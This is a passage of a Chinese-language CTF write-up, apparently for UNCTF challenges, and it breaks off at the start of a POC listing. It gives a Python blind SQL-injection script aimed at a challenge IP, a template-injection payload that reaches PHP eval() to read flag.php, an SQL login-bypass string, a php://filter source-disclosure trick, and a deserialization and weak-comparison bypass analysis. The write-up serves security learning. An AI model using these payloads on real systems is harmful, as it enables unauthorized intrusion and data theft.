<p>参考：<a href="https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener"><a href="https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</a></a></p>
<p><img src="/.com//8.png" alt></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"><span class="keyword">for</span> space <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>,<span class="number">123</span>):</span><br><span class="line">        <span class="comment">#payload = "admin' and ascii(substr((select database()),%d,1))=%d##########################cookie12345678"%(space,i)</span></span><br><span class="line">        <span class="comment">#payload = "admin' and ascii(substr((select group_concat(distinct database_name) from mysql.innodb_index_stats),%d,1))=%d##########################cookie123456780121"%(space,i)</span></span><br><span class="line">        <span class="comment">#payload = "admin' and ascii(substr((select group_concat(distinct table_name) from mysql.innodb_index_stats),%d,1))=%d##########################cookie12345678"%(space,i)</span></span><br><span class="line">        payload =  <span class="string">"admin' and ascii(substr((select * from fl4g),%d,1))=%d##########################cookie12345678"</span>%(space,i)</span><br><span class="line">        <span class="comment">#print payload+"the character "+str(space)+" try --"+chr(i)</span></span><br><span class="line">        </span><br><span class="line">        url1 = <span class="string">'http://101.71.29.5:10002/login_create.php'</span></span><br><span class="line">        register_data = &#123;<span class="string">"username"</span>:payload,<span class="string">"password"</span>:<span class="string">"123"</span>,<span class="string">"re_password"</span>:<span class="string">"123"</span>,<span class="string">"submit"</span>:<span class="string">"Register"</span>&#125;</span><br><span class="line">        r_register = s.post(url1,data=register_data)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        url2 = <span class="string">'http://101.71.29.5:10002/login.php'</span></span><br><span class="line">        login_data = &#123;<span class="string">"login_user"</span>:payload,<span class="string">"login_password"</span>:<span class="string">"123"</span>,<span class="string">"mysubmit"</span>: <span class="string">"Login"</span>&#125;</span><br><span class="line">        r_login = s.post(url2,data=login_data)</span><br><span class="line"></span><br><span class="line">        url3 = <span class="string">'http://101.71.29.5:10002/pass_change.php'</span></span><br><span class="line">        update_data = &#123;<span class="string">"current_password"</span>:<span class="string">"123"</span>,<span class="string">"password"</span>:<span class="string">"12345"</span>+str(i),<span class="string">"re_password"</span>:<span class="string">"12345"</span>+str(i),<span class="string">"submit"</span>: <span class="string">"Reset"</span>&#125;</span><br><span class="line">        r_update = s.post(url3,data=update_data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Password successfully updated"</span> <span class="keyword">in</span> r_update.text:</span><br><span class="line">            flag = flag + chr(i)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"flag is ------&gt;"</span>+flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>





<h2 id="审计一下世界上最好的语言吧"><a href="#审计一下世界上最好的语言吧" class="headerlink" title="审计一下世界上最好的语言吧"></a>审计一下世界上最好的语言吧</h2><p>获得源码，审计源码</p>
<p>全局搜索，在parse_template.php下看到<strong>‘eval()’</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">eval</span>(<span class="string">"if("</span>.$strIf.<span class="string">") &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;"</span>);</span><br></pre></td></tr></table></figure>

<p>一路溯源，漏洞触发需要经过如下几个环节</p>
<p>定位：index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($n&gt;<span class="number">0</span>) &#123;</span><br><span class="line">	$searchword = $searchword[<span class="number">1</span>][<span class="number">0</span>]；</span><br><span class="line">	<span class="keyword">if</span> (strlen($searchword)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">		parse_again($searchword);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">"searchword!!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">exit</span>(<span class="string">"input your searchword~"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>跟踪parse_again()</p>
<p>定位：parse_template.php::parse_again()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parse_again</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $template_html,$searchword;<span class="comment">//$searchword=&#123;i&#123;haha:type&#125;</span></span><br><span class="line">	$searchnum 	= <span class="keyword">isset</span>($GLOBALS[<span class="string">'searchnum'</span>])?$GLOBALS[<span class="string">'searchnum'</span>]:<span class="string">""</span>;<span class="comment">//searchnum=&#123;end%20if&#125;</span></span><br><span class="line">	$type 		= <span class="keyword">isset</span>($GLOBALS[<span class="string">'type'</span>])?$GLOBALS[<span class="string">'type'</span>]:<span class="string">""</span>;<span class="comment">//type=f:rea&#123;haha:typename&#125;</span></span><br><span class="line">	$typename 	= <span class="keyword">isset</span>($GLOBALS[<span class="string">'typename'</span>])?$GLOBALS[<span class="string">'typename'</span>]:<span class="string">""</span>;<span class="comment">//typename=dfile(%27flag.php%27)&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	$searchword = substr(RemoveXSS($searchword),<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">	$searchnum = substr(RemoveXSS($searchnum),<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">	$type = substr(RemoveXSS($type),<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">	$typename = substr(RemoveXSS($typename),<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">	$template_html = str_replace(<span class="string">"&#123;haha:searchword&#125;"</span>,$searchword,$template_html);</span><br><span class="line">	$template_html = str_replace(<span class="string">"&#123;haha:searchnum&#125;"</span>,$searchnum,$template_html);</span><br><span class="line">	$template_html = str_replace(<span class="string">"&#123;haha:type&#125;"</span>,$type,$template_html);</span><br><span class="line">	$template_html = str_replace(<span class="string">"&#123;haha:typename&#125;"</span>,$typename,$template_html);</span><br><span class="line">	$template_html = parseIf($template_html);</span><br><span class="line">	<span class="keyword">return</span> $template_html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>跟进函数<strong>parseIf()</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseIf</span><span class="params">($content)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (strpos($content,<span class="string">'&#123;if:'</span>)=== <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $Rule = <span class="string">"/&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;/is"</span>;</span><br><span class="line">        preg_match_all($Rule,$content,$iar);</span><br><span class="line">        $arlen=count($iar[<span class="number">0</span>]);</span><br><span class="line">        $elseIfFlag=<span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">for</span>($m=<span class="number">0</span>;$m&lt;$arlen;$m++)&#123;</span><br><span class="line">            $strIf=$iar[<span class="number">1</span>][$m];</span><br><span class="line">            $strIf=parseStrIf($strIf);</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="string">"if("</span>.$strIf.<span class="string">") &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在parseIf中，当$content中有<strong>{if:</strong>时，进入else语句。这里的正则规则如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&#123;<span class="keyword">if</span>:(.*?)&#125;(.*?)&#123;end <span class="keyword">if</span>&#125;/is</span><br></pre></td></tr></table></figure>



<p>在parse_again()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$template_html = file_get_contents(<span class="string">"template.html"</span>);</span><br></pre></td></tr></table></figure>

<p>然后一下这段代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$template_html = str_replace(<span class="string">"&#123;haha:searchword&#125;"</span>,$searchword,$template_html);</span><br><span class="line">$template_html = str_replace(<span class="string">"&#123;haha:searchnum&#125;"</span>,$searchnum,$template_html);</span><br><span class="line">$template_html = str_replace(<span class="string">"&#123;haha:type&#125;"</span>,$type,$template_html);</span><br><span class="line">$template_html = str_replace(<span class="string">"&#123;haha:typename&#125;"</span>,$typename,$template_html);</span><br></pre></td></tr></table></figure>

<p>在temlate.html中全局搜索一下<strong>{haha:searchword}</strong>，以及<strong>{haha:searchnum}</strong>，发现有一处，这两个字符串是先后顺序</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>&#123;haha:searchword&#125; <span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">small</span>&gt;</span>共有<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sea-text"</span>&gt;</span>&#123;haha:searchnum&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span>个影片</span><br></pre></td></tr></table></figure>



<p>那么为了触发eval()函数，我们可以把这两处分别替换成</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$searchword=&#123;i&#123;haha:type&#125;</span><br><span class="line">$searchnum=&#123;end%<span class="number">20</span><span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure>

<p>替换成</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;i&#123;haha:type&#125; <span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">small</span>&gt;</span>共有<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sea-text"</span>&gt;</span>&#123;end if&#125;</span><br></pre></td></tr></table></figure>

<p>接着按照这个思路</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$type=f:rea&#123;haha:typename&#125;</span><br><span class="line">$typename=dfile(%<span class="number">27</span>flag.php%<span class="number">27</span>)&#125;</span><br></pre></td></tr></table></figure>

<p>替换成</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:readfile(%27flag.php%27)&#125; &lt;/a&gt; &lt;small&gt;共有&lt;span class="sea-text"&gt;&#123;end if&#125;</span><br></pre></td></tr></table></figure>

<p>经过以下这段代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">preg_match_all($Rule,$content,$iar);</span><br><span class="line">$arlen=count($iar[<span class="number">0</span>]);</span><br><span class="line">$elseIfFlag=<span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">for</span>($m=<span class="number">0</span>;$m&lt;$arlen;$m++)&#123;</span><br><span class="line">    $strIf=$iar[<span class="number">1</span>][$m];</span><br></pre></td></tr></table></figure>

<p>获得</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$strIf = readfile(%<span class="number">27</span>flag.php%<span class="number">27</span>)</span><br></pre></td></tr></table></figure>

<p>然后获得flag</p>
<p>最终payload为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?content=&lt;search&gt;&#123;i&#123;haha:type&#125;&lt;/search&gt;</span><br><span class="line">&amp;searchnum=&#123;end%<span class="number">20</span><span class="keyword">if</span>&#125;&amp;type=f:rea&#123;haha:typename&#125;&amp;typename=dfile(%<span class="number">27</span>flag.php%<span class="number">27</span>)&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"www.zip"</span>&gt;</span>source code<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">$flag = <span class="string">"UNCTF&#123;5ee25610af306b625b4cadb4cb5fa24b&#125;"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>



<h2 id="K-amp-K老家"><a href="#K-amp-K老家" class="headerlink" title="K&amp;K老家"></a>K&amp;K老家</h2><p>用户名：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">' || '</span><span class="number">1</span><span class="string">' || '</span><span class="number">1</span></span><br></pre></td></tr></table></figure>



<p>密码随便写，登录即可。</p>
<p>当我们查看俱乐部运维手册的时候</p>
<p><img src="/.com//28.png" alt></p>
<p>出现上述情况,说明我们需要正确cookie才能访问<strong>?m=debug</strong></p>
<p>那么我们需要知道是如何构造cookie的,那么我们就需要源码.</p>
<p>在主页存在文件包含漏洞，使用伪协议爆出源码(这里的伪协议用大小写绕过)：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phP:<span class="comment">//filter/read=convert.bAse64-encode/resource=index</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//26.png" alt></p>
<p>最终获得源码,结构如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--&gt;inc</span><br><span class="line">  -+&gt;config.php</span><br><span class="line">  -+&gt;db.php</span><br><span class="line">  -+&gt;func.php</span><br><span class="line">  -+&gt;session.php</span><br><span class="line">--&gt;access.php</span><br><span class="line">--&gt;debug.php</span><br><span class="line">--&gt;home.php</span><br><span class="line">--&gt;index.html</span><br></pre></td></tr></table></figure>

<p>在home.php中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    mothed_waf($mothed);</span><br><span class="line">    $page = $mothed . <span class="string">".php"</span>;</span><br><span class="line">    <span class="keyword">include</span>($page);</span><br><span class="line">    check($cookie, $db, $session);</span><br><span class="line">    $d = <span class="keyword">new</span> debug($session, $d);</span><br><span class="line">    $d-&gt;vt($session, $d);</span><br><span class="line">    $d-&gt;debug($session);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>然后我们看看debug.php,其中的debug::__tosString()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;access_token === <span class="string">""</span>) &#123;</span><br><span class="line">		<span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里<strong>include(“flag.php”)</strong>在魔术方法__toString()中,所以我们要想办法触发这个魔术方法.<strong>当一个对象作为字符串被调用的时候,该魔术方法会被触发</strong>.</p>
<p>看到debug::debug()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">debug</span><span class="params">($obj, &amp;$d)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;vt($obj, $d);</span><br><span class="line">	check1(<span class="keyword">$this</span>-&gt;ob);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;choose === <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;choose = <span class="keyword">$this</span>-&gt;ob-&gt;choose;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;choose !== <span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;choose === <span class="number">2</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'&lt;script&gt;alert("This is a forbidden option");window.location.href="./home.php?m=debug";&lt;/script&gt;'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">switch</span>(<span class="keyword">$this</span>-&gt;choose)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"You like hsy :("</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;forbidden;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Good debuger :)"</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个方法中的case2</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">	<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;forbidden;</span><br><span class="line">	<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>这作为触发__toString()的触发点.</p>
<p>看看如何触发debug::debug()方法,在home.php中有如下代码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$d = <span class="keyword">new</span> debug($session, $d);</span><br><span class="line">$d-&gt;vt($session, $d);</span><br><span class="line">$d-&gt;debug($session);</span><br></pre></td></tr></table></figure>

<p>这里调用了debug()函数</p>
<p>主要思路是这样,然后要解决如何bypass掉其中的一些waf.</p>
<p>(1)  首先是home.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    mothed_waf($mothed);</span><br><span class="line">    $page = $mothed . <span class="string">".php"</span>;</span><br><span class="line">    <span class="keyword">include</span>($page);</span><br><span class="line">    check($cookie, $db, $session);</span><br><span class="line">    $d = <span class="keyword">new</span> debug($session, $d);</span><br><span class="line">    $d-&gt;vt($session, $d);</span><br><span class="line">    $d-&gt;debug($session);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>先跟进<code>check()</code>函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($str, $db, &amp;$session)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>($str == <span class="string">""</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'&lt;script&gt;alert("Please login again");window.location.href="./index.php";&lt;/script&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $objstr = cookie_decode($str);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $session = unserialize($objstr);</span><br><span class="line">        $session-&gt;id = intval($session-&gt;id);</span><br><span class="line">        waf($session-&gt;username);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'&lt;script&gt;alert("Identity problems, please relogin");window.location.href="./index.php";&lt;/script&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $db-&gt;index_check($session-&gt;id, $session-&gt;username);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的$objstr是$cookie[‘identity’]对应的解码结果,解码后对其进行反序列化,没有任何过滤,我们可以进行任意的反序列化操作.</p>
<p>跟进$db-&gt;index_check()函数</p>
<p>db::index_check()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index_check</span><span class="params">($i, $u)</span> </span>&#123;</span><br><span class="line">    $sql = <span class="string">"SELECT id,username FROM users WHERE username = '$u' and id = $i"</span>;</span><br><span class="line">    $con = <span class="keyword">$this</span>-&gt;init();</span><br><span class="line">    mysql_select_db(<span class="string">"unctf"</span>, $con);</span><br><span class="line">    $result = mysql_query($sql,$con);</span><br><span class="line">    $row = mysql_fetch_array($result);</span><br><span class="line">    <span class="keyword">if</span>(count($row) &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        setcookie(<span class="string">"identy"</span>, <span class="string">""</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'&lt;script&gt;alert("Identity problems, please relogin");window.location.href="./index.php";&lt;/script&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出这里$row其中的数据不能为空,那么也就是说明<strong>我们给的username和id,到数据库查询的时候,必须要有查询结果.</strong></p>
<p>(2)  过掉check()函数后</p>
<p>其中debug类的__construct()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($obj, &amp;$d)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;vt($obj, $d);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ob-&gt;username !== <span class="string">"debuger"</span>) &#123;</span><br><span class="line">		setcookie(<span class="string">"identy"</span>, <span class="string">""</span>);</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'&lt;script&gt;alert("Identity problems, please relogin");window.location.href="./index.php";&lt;/script&gt;'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以及在debug:debug()中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">debug</span><span class="params">($obj, &amp;$d)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;vt($obj, $d);</span><br><span class="line">	check1(<span class="keyword">$this</span>-&gt;ob);</span><br><span class="line">	....&#125;</span><br></pre></td></tr></table></figure>

<p>跟进check1()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check1</span><span class="params">($obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>($obj-&gt;username !== <span class="string">"debuger"</span>) &#123;</span><br><span class="line">        setcookie(<span class="string">"identy"</span>, <span class="string">""</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'&lt;script&gt;alert("Identity problems, please relogin");window.location.href="./index.php";&lt;/script&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里都对username做了检测,检测是否为’debuger’</p>
<p><img src="/.com//29.png" alt="1573559986824"></p>
<p>这里是矛盾的,但是这里是可以绕过的</p>
<p>第一个使用’===’来检测$this-&gt;choose是否为2</p>
<p>第二个switch使用’==’来检测$this-&gt;choose是否为2,我们知道’==’为弱类型比较,所以我们使$this-&gt;choose=’2’,可以绕过第一个检验.</p>
<p>综上所述,POC如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 